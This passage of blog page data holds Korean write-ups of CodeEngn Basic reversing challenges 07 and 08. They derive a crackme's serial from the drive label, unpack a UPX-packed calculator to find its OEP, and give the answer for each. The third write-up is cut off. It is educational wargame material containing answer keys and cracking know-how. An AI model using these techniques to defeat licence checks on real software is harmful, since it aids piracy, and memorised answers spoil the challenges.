url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA20lEQVR42hXOb0+CQAAH4N+BLZzC/ekE5h1DPBCd2DyqNRlDLMeraqWvetn3/xLN5xM8sNZWW6t02ndd3ZxwPpODizeAEfiEeARALPXjItPxXAhZlmutE8GF44ywqbarVaV1cjo2r/07Pj/QOhgADlAQDwB0rOqlUhGfq9CYJIy473uEEPz9XL+Hi9Jt21yL6otdfie2wD6FzMAzMsmAjPtPhu2D+5KLZ8Hr6XTnOktggaHvDy9dkuzy3D7MjDpu7goOE4BRjChcClAaGMnTUOYzmTOWjsfRbQX6DzCWGf182rEsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/4cc255d05405db83943b98e4d480f096/c9b55/3.webp 165w,\n/static/4cc255d05405db83943b98e4d480f096/f2908/3.webp 330w,\n/static/4cc255d05405db83943b98e4d480f096/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/4cc255d05405db83943b98e4d480f096/04c57/3.png 165w,\n/static/4cc255d05405db83943b98e4d480f096/d9ecf/3.png 330w,\n/static/4cc255d05405db83943b98e4d480f096/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/4cc255d05405db83943b98e4d480f096/32056/3.png\"\n            alt=\"serial num\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>시리얼 넘버는 ConcatString, String1임을 추측할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 223px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 90.9090909090909%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAIAAADUsmlHAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABy0lEQVR42p3T2Y7aMBQGYL//GyFNhQBVgiFEMCxh4oUERBbiLQuQzU4VQBp6UYL6yTe++O3jYxt4nhdF7Jxlvh8kScI5iyIaBoGQsukCLudzXhR1XVdVVZVVUZR5nhd5XlW11o16CTiOAyG0LGu5XNq2vVqtoG0jhNbrNSHk8BKYTCbj8dg0zX6/PxqNhsPhx8evwWDQ6/UIIY+K/gF4nsc5F0JIKaUQUgjOOWOMdxFCAIJ2Bvz+hLax3RjW2kQQYYwxwZggjO8DIgQRcp5YlvW1XAJGo8APYikpY2EQXq950zRad/Q5juOiKEBd1XVdK6Xux9OduRullNYatPs0+p7Rd0rdhn7Mlf6h9PPq4J55XvXNzdtwVZUL04QI+95xu/3GNp6bM2M6NYzZzt07rrOYfy0Wc4TJarMxpjO4RY8amwZorTljp4g+2s+l4DyiEWU8SdMkTQRvLy/LMsY5pSxN07/K/m+gfE/R+pm2/6AsgXgD5zxJkjRLb49QMMYopVJKIF+Kb6751ficjEa/3f3+cjmfTifHcdI07QgzxoIgoJRabaunCBNKqeu6hJCOcBzHYRi2T9l1jsej7/uHw8F13d1uF4ZhHMd/AM9p9az5S4qEAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1beda8490573ac8b212ea7eb5a0119c4/c9b55/4.webp 165w,\n/static/1beda8490573ac8b212ea7eb5a0119c4/ca0a1/4.webp 223w\"\n              sizes=\"(max-width: 223px) 100vw, 223px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1beda8490573ac8b212ea7eb5a0119c4/04c57/4.png 165w,\n/static/1beda8490573ac8b212ea7eb5a0119c4/e92b6/4.png 223w\"\n            sizes=\"(max-width: 223px) 100vw, 223px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1beda8490573ac8b212ea7eb5a0119c4/e92b6/4.png\"\n            alt=\"serial\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>코드엔진에서 원하는 답을 찾기 위해 C드라이브의 이름을 바꾸었다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 272px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA90lEQVR42nWOwUrDQBiE85iClGrBm6/hyaeoFIQevDSx5iAUis3Bgw3tRaJJTDfp7iZZ201azHb//YWU4smPYZjDDIyFaI4AmHr7TZOIZUQwKkVZiUI1Df6PNSzQFYCIGsz0fXU3ebt/WQ4m84fXwPaj54B7pJqtpEek1/o02UZFta9rrbV1Pfu6XXDJaF6KGy89d6IrN7l8DC/GUe8p7jphZ/TRtT87o6ANwZkdDn1S0uynaSx37PQH/bm/yPNcbgRbpzQla0JyzjjNWEY4pRtRpkm839VpEqtG/d1GRKWUMQYRzUkaAMwJRACjtTaIh4OGtnkc/wJt9wrfvcdYwgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/63f4eccee045d3ea8bdece175badf16a/c9b55/5.webp 165w,\n/static/63f4eccee045d3ea8bdece175badf16a/542bb/5.webp 272w\"\n              sizes=\"(max-width: 272px) 100vw, 272px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/63f4eccee045d3ea8bdece175badf16a/04c57/5.png 165w,\n/static/63f4eccee045d3ea8bdece175badf16a/2aae8/5.png 272w\"\n            sizes=\"(max-width: 272px) 100vw, 272px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/63f4eccee045d3ea8bdece175badf16a/2aae8/5.png\"\n            alt=\"JE\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>비어있던 ConcatString에 CodeEngn이라는 문자열이 들어옴을 확인하였다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 510px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.181818181818183%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA0klEQVR42k2Oy26CQABF78gMQ3CsIyigjASsiIBG5DFp0nTRRNJFG+PSnf//F7aNC+/iJCdncyFqJUJAEUwBgqf9iWWNtsUxL7NjU3W6TrfpXM3VMuy6uqpK8J9vujCRjZFJTBxMXXguZv/0JFfxLm5zJzks8t1snQjVLktlB5z7lPpAf0OxwanE2x6yg60x0hAaTIM2/OVzHV3S4FREX3HQy+FH8Xpu9tfV6gy0kP27HQIRQQJIYAy4wORx3WC2JxyfEo8ZnLOBQSgzLMs0Tfab73k5FMCtIrpMAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/0ee9dcf6c417e84cc92830225308a592/c9b55/6.webp 165w,\n/static/0ee9dcf6c417e84cc92830225308a592/f2908/6.webp 330w,\n/static/0ee9dcf6c417e84cc92830225308a592/b7235/6.webp 510w\"\n              sizes=\"(max-width: 510px) 100vw, 510px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/0ee9dcf6c417e84cc92830225308a592/04c57/6.png 165w,\n/static/0ee9dcf6c417e84cc92830225308a592/d9ecf/6.png 330w,\n/static/0ee9dcf6c417e84cc92830225308a592/0abdd/6.png 510w\"\n            sizes=\"(max-width: 510px) 100vw, 510px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/0ee9dcf6c417e84cc92830225308a592/0abdd/6.png\"\n            alt=\"StringToAdd\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>계속 실행시켜 보면, CodeEngn이 ADD연산자로 인해 변하는 것을 볼 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 555px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.545454545454545%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAl0lEQVR42kWMzQ6CMBgE92tLU0Uotvy0AhWJmKiQYEyMB2++/zspiYlz2NPsQM0tq4CGYIEtkC9LBaGA7/bnopqcv5Rlr/VYlZmUIMKf5x4v4E1oAAUkQAyShAh+dzj5+to2nfNW63EY7vMthJBba4xZvuEx2WO86VPlVolL4nrN019WySwTwjASnBNjjHPGuYgWhBBf4wPRfgnPedDgMgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/88cc5d55b5a31130c7fae154f32656a5/c9b55/7.webp 165w,\n/static/88cc5d55b5a31130c7fae154f32656a5/f2908/7.webp 330w,\n/static/88cc5d55b5a31130c7fae154f32656a5/2e9dd/7.webp 555w\"\n              sizes=\"(max-width: 555px) 100vw, 555px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/88cc5d55b5a31130c7fae154f32656a5/04c57/7.png 165w,\n/static/88cc5d55b5a31130c7fae154f32656a5/d9ecf/7.png 330w,\n/static/88cc5d55b5a31130c7fae154f32656a5/cd039/7.png 555w\"\n            sizes=\"(max-width: 555px) 100vw, 555px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/88cc5d55b5a31130c7fae154f32656a5/cd039/7.png\"\n            alt=\"ConcatString\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>CodeEngn이 EqfgEngn으로 바뀐 것을 볼 수 있다.</p>\n<p>C드라이브의 이름이 바뀐 후의 시리얼 넘버는 위에서 보았던 것처럼 4023FD의 StringToAdd와 40225C의 StringToAdd가 합쳐진 값이 됨을 알 수 있다. 즉 C드라이브의 이름이 CodeEngn으로 바뀐 후의 시리얼 넘버는 L2C-5781EqfgEngn4562-ABEX일 것이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 308px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.87878787878788%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACrElEQVR42nWS3UtTYRzHf5PNnDMospsuhBSzCOwFuuomiEj0D+hmSimFL9GbCZKUUhNzVkPqoj8iS7IIIWeGumRurp1ttpx7OdvZS9vZ8eycnZdnZ3viTHy5qA8fvjzPxY/fw8MX8nleEASe5wVRyLE5nuMVpYj/T6lUwhgjhNJ/UsCy7BbLsrkcq6KmIAiiKAplcjuwLMvzPEJIUZRisSjLcjKRAJ/X63a7l202N0GsrKx4vV6bzeZ0Ou12u8PhYBgmuwNN0+l0hvB4XD9dFEX51n2QoKhMOk3FqDhFhYLBGBmNkWQqkYzHqFQyqaCCgpCCEJIkpVDIMtlAYMPn88Vi0VBgE0xvXz+efDHyxvLIYh6YGO03jz5U09RvNj0Yf3Z3dETVNDw0OdFxu/vqlZabt+4ZjUZje4exvQO6nw61D97vejJ4beBOS8/11t7O/bb1dbX1dbX2dt4YHmy+dBGgor6uub4C6iorm7Ra4IR8ZouhWYbJqX+iynGq2weey/E8zTAKLo2ZnwOAofpYdQVUajR6jQYwLiGECgUky2j7i8s3JIoiUlMSBbGAEMb4peUVAGh1taAB0GhU4/FEJBIhw+FImPSv//IQRCKVIsnob78/Fov6/f7AxqYoynvD2lrYBWNcLBZLZf7ZB4yxoii7wzrdUXVMo24HRSlut2IfkiRJgpCXZRkhtN0/jLF5wlzefGRvM8tymUyapmlabUE5s3QwGAyHwx4PYV9dDYdCBEHQdHZsfAwADh0+XmPQ66uqDIaD6rMlSUIy2rWACqFgiIyQaw7nt/mFSIR0rbk4jrNMWgDg7PnLDY0NjU0nm8+cg++L818XrHOLZZesc8tW69L8Z+uXqZn3H2dnZmY/fZiefjc1tfzD1tPXCwCnGi+cPqA7Yag5o6/6C1NgT8vZjy+CAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/37042946e00c838c36b5a743e3bea629/c9b55/8.webp 165w,\n/static/37042946e00c838c36b5a743e3bea629/6882a/8.webp 308w\"\n              sizes=\"(max-width: 308px) 100vw, 308px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/37042946e00c838c36b5a743e3bea629/04c57/8.png 165w,\n/static/37042946e00c838c36b5a743e3bea629/2ece4/8.png 308w\"\n            sizes=\"(max-width: 308px) 100vw, 308px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/37042946e00c838c36b5a743e3bea629/2ece4/8.png\"\n            alt=\"answer\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>정답: EqfgEngn</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"2406a24c-8d7a-53bb-bc27-baae5a82267c","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-07/","title":"CodeEngn Basic 07","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#e8e8e8","images":{"fallback":{"src":"/static/b1e5f9361080df337a650000c987735c/c0c4f/0.png","srcSet":"/static/b1e5f9361080df337a650000c987735c/ce495/0.png 64w,\n/static/b1e5f9361080df337a650000c987735c/448cf/0.png 128w,\n/static/b1e5f9361080df337a650000c987735c/c0c4f/0.png 255w","sizes":"(min-width: 255px) 255px, 100vw"},"sources":[{"srcSet":"/static/b1e5f9361080df337a650000c987735c/984bc/0.webp 64w,\n/static/b1e5f9361080df337a650000c987735c/75874/0.webp 128w,\n/static/b1e5f9361080df337a650000c987735c/1f00a/0.webp 255w","type":"image/webp","sizes":"(min-width: 255px) 255px, 100vw"}]},"width":660,"height":401.17647058823525}}}},"body":"<p>OEP를 구하시오</p>\n<p>Ex) 00400000</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 255px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 100.60606060606061%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAIAAAAC64paAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADl0lEQVR42l2Q228bRRTG9w+k0FIqSsVNCYQ2TXpJ2iSkIASFVKA+8MYL/wK8UFAoMSkkpLbrdeKs7b3PnHNmZq++7LpxbnYltA5IlE8jzTmf9Gm++Wk31r6bvvflh6vL0x+vTK0svb+ydGX1znufLJ2/PvPKzNSF2ZkLszPnrk69enX64vxHr83PnJudvrw4//bdW+evfaAtf/v93NrXtx/eX3z41dzaZ3MPPr/14IuFb+6/eXf+8tKNd+/dubJ8842F2UuL199aunlpce7129feWV2c+nT54sKs1jB2n/y19WR7e32jZHpe27bWNx5vbu8ESVyulP/YeRp00rTXTf5zok7azbOma2u9TgcBlVSEIsuyPOtzxsIwGg6HSkoicXAwPHxZw+FwPBr5AFqSJKenp6PReDwenxwfH5+cjF+8GJ2eHh0djSY6elnHJyf9fl9Judc0tDRN8yzL8zzLskGeD/K8WPJ8MBjk/w7/U5ZlB88Pmpap9Xo9xpiUMkkSFUykijsMgjAM1dmqVLGEoVJnhkqTpGlbWhzHnuv2BwNlmeKHH8X6Y/HTz/LRI7G17XqeD5w2N0GvMyLPdT3GYG+Xt9scYNcwtG63m6TpweFhrJRsm4HjKM+Vjh24rhCChJCuI5kvpJRCEJEETohBEBhmW0vSVHIufD9O0yAKOUgUUoUBoBKTBKCkYpCCSJ5ZksIwMCxTCzodWSqJP7dUkhBC00DL8oVg1YpwXQTwdJ1aLQYEaNno+4yx9V9U5Zlq2c3iz5wEQ4yjSEoJyBBBCAHAiZCIADhA4XAARCQSjsMRRFE7ShNRrchqLYxjKcg00fNASmw2BWeEyFstcj0gQeR6xDkSOA4iSMNsFWFVfqrKk7AUTUO4bhE2DMmYIOKGIR0HSSDxAhUSmCYxXxlWS4ujmCEygCiKim6MTQoTQNEfEQEYnzhFeyzEua8k7ZttLUhTUdqQv5WCOBF0BowJwavVf4A19kSrxQE5+D5wDuiXd0ivqaY1AQYAwHlc1JaIHBEnwIAm4sWLE4QFLRKCfB8QlWG1tTCOwdiHVjsIIyIyLfB9Tki2XfyxaAoIvAiiVwDjANz3JGKj1dS6WRZUK0Gj0en1wyBoNALGCAkb+8JnxIEzQMY5CIGuQ5yRlMJ1I6S262i6rlfqekWv6br+rFar1ir1ep05Hncc5nrMcX3T8U2btW2/bXttu1arlauV+m79199LfwPGfufrjDI7bgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b1e5f9361080df337a650000c987735c/c9b55/0.webp 165w,\n/static/b1e5f9361080df337a650000c987735c/765b8/0.webp 255w\"\n              sizes=\"(max-width: 255px) 100vw, 255px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b1e5f9361080df337a650000c987735c/04c57/0.png 165w,\n/static/b1e5f9361080df337a650000c987735c/b8c8f/0.png 255w\"\n            sizes=\"(max-width: 255px) 100vw, 255px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b1e5f9361080df337a650000c987735c/b8c8f/0.png\"\n            alt=\"Rekenmachine\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>계산기 프로그램이다.\r\n올리디버거로 열기 이전에, 어떤 파일인지를 파악하기 위해 PEiD로 열어보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 413px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.57575757575757%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACSklEQVR42j2P3W/SYBTG+68ZJ7sw2fViNklUxMTsRmOMf5PJZmCsjOH0YmzqNmjpd+H9bvt+tNAWSMbwxsDUX56cPOfi5DyPtvvx/e6Hg71P73YOapV6dbteffL6eeVNtbIx2xuzVdvfqu1v16uPX+1V6tVHL57tHNSevn2pdXsXzbPTRqd9pLc+HzcO9dZxt3PYbh21Txpnp4d660g/aZ13v15e/Nf5VU//fv7lVNfyaR5RhhFihGAICcIRZWA0huMxRgiMAUEolXK1vF/d36+Wy+Xd3e/VimLiua4WRZGQUilJCI2ieDKZ5EU+m83KjYqiSBIeRbGUklKaJEmWZWmaZlkmpdKG5tDzfIywMTAsyxJC5P8oikKp1PN8y7IpYUEQEEynG3iSAAC1wA9H4YhRalm2YztKpcU/yrKYTKYAwCDwCaVhOLJt27bsJOFSSgih5rqu7wcYYYzIJlL28DPP87IoJlnmuZ5t2QBA319H8P0gz3PO+fpYpSrN1h2meT6fL2az2Xw+38zFg5FCxHGsVMr52nDOy7LM0vWqUUIppUIItiaKo5gSQhkbA8AYwxhTxsoNf8vk+UPtsiy1fn9gGiYA0LFt0xw6juPYNsbENMx+v28NLc/zpVIIIc65ECJN04ixJEmklNqgP3BdD0CYqjTw/TAMg3A0yacAwpuBQSO2WCyUktfXNwAiIQSXwhwOEUJRHGuNZkNvt5vN44te77Z/+/P618gL4jGORlAAEgydyx9XhmEIzhmhEaXI8c9aut7pfOt0/wAaK1Kcb5J2GAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/dc27029ce7380baae4328d27045d6cd3/c9b55/1.webp 165w,\n/static/dc27029ce7380baae4328d27045d6cd3/f2908/1.webp 330w,\n/static/dc27029ce7380baae4328d27045d6cd3/f2c1b/1.webp 413w\"\n              sizes=\"(max-width: 413px) 100vw, 413px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/dc27029ce7380baae4328d27045d6cd3/04c57/1.png 165w,\n/static/dc27029ce7380baae4328d27045d6cd3/d9ecf/1.png 330w,\n/static/dc27029ce7380baae4328d27045d6cd3/6c1e7/1.png 413w\"\n            sizes=\"(max-width: 413px) 100vw, 413px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/dc27029ce7380baae4328d27045d6cd3/6c1e7/1.png\"\n            alt=\"PEiD\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>UPX1으로 패킹되어 있는 것을 볼 수 있다. upx 도구를 이용해 언패킹을 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.060606060606062%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAuElEQVR42mWNXWvEIBRER69xbVI/cr1RY9LQPPT//8VSWdiFHobhwDwMgg/Rh8yZcxaWldf8nctPW7pbO9KpTaL5WOpVhUWyOOfwwo3Q8A/gAQSAgQR8js5ABOxYacgMLEO00WYysm2yyeJnAD6EUgqAGOPeKgBmTpwUKa01NKDwbAD7flxfl7WWObfafAi9d+cerbX7vq21InKcp7VWKYV3Sim11hSj956IpmnSL8gYo9TfIRHhH78ZXQqQp2XcVwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/3656e33b93942dc351403fd94add2cce/c9b55/2.webp 165w,\n/static/3656e33b93942dc351403fd94add2cce/f2908/2.webp 330w,\n/static/3656e33b93942dc351403fd94add2cce/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/3656e33b93942dc351403fd94add2cce/04c57/2.png 165w,\n/static/3656e33b93942dc351403fd94add2cce/d9ecf/2.png 330w,\n/static/3656e33b93942dc351403fd94add2cce/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/3656e33b93942dc351403fd94add2cce/32056/2.png\"\n            alt=\"upx\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>이제 패킹이 풀린 파일을 올리디버거로 실행시킨다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.363636363636363%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAsklEQVR42gXB2wqCMBgA4OVhW+L+P9achzTpYERQTSOSyqvKK6HLoOgJguj9r/o+8v1+uu5ZLNqmee2rh7r/kvYijwYmJfglYIloAHa+2PuwFVACGACDWA0GO7LebLROVaBnsyzUw+B8XdVGx0iZ7XFXAOfc8TyeZ9k4lmkoowAR+5TahBByqA95vtBhXBRzJXX1vuWnJUSAU6kygYJaluNSLxJqxFjC+pJxlzLbdno96w/3BhQA41HRSQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/2c1d5a8957fa42259465aa8a4b804901/c9b55/3.webp 165w,\n/static/2c1d5a8957fa42259465aa8a4b804901/f2908/3.webp 330w,\n/static/2c1d5a8957fa42259465aa8a4b804901/ff4b8/3.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/2c1d5a8957fa42259465aa8a4b804901/04c57/3.png 165w,\n/static/2c1d5a8957fa42259465aa8a4b804901/d9ecf/3.png 330w,\n/static/2c1d5a8957fa42259465aa8a4b804901/32056/3.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/2c1d5a8957fa42259465aa8a4b804901/32056/3.png\"\n            alt=\"findOEP\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>패킹이 풀렸음을 확인할 수 있다. OEP는 01012475이다.</p>\n<p>정답: 01012475</p>","categories":["writeup","wargame","reversing"],"date":"July 21, 2015","description":"","id":"7c40d3ca-baec-5e07-a74d-9e45d4ce854b","keywords":["codeengn-basic"],"slug":"/CodeEngn-Basic-WriteUp-08/","title":"CodeEngn Basic 08","readingTime":{"text":"1 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/93f578301acf0aed2ce921e4ce22cfec/94d04/0.png","srcSet":"/static/93f578301acf0aed2ce921e4ce22cfec/8c9ae/0.png 58w,\n/static/93f578301acf0aed2ce921e4ce22cfec/193e7/0.png 115w,\n/static/93f578301acf0aed2ce921e4ce22cfec/94d04/0.png 230w","sizes":"(min-width: 230px) 230px, 100vw"},"sources":[{"srcSet":"/static/93f578301acf0aed2ce921e4ce22cfec/0ad3d/0.webp 58w,\n/static/93f578301acf0aed2ce921e4ce22cfec/6dc17/0.webp 115w,\n/static/93f578301acf0aed2ce921e4ce22cfec/8bcd1/0.webp 230w","type":"image/webp","sizes":"(min-width: 230px) 230px, 100vw"}]},"width":660,"height":398.8695652173913}}}},"body":"<p>StolenByte를 구하시오\r\nEx) 75156A0068352040</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 230px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.42424242424243%; position: relative; bottom: 0; left: 0; background-image: 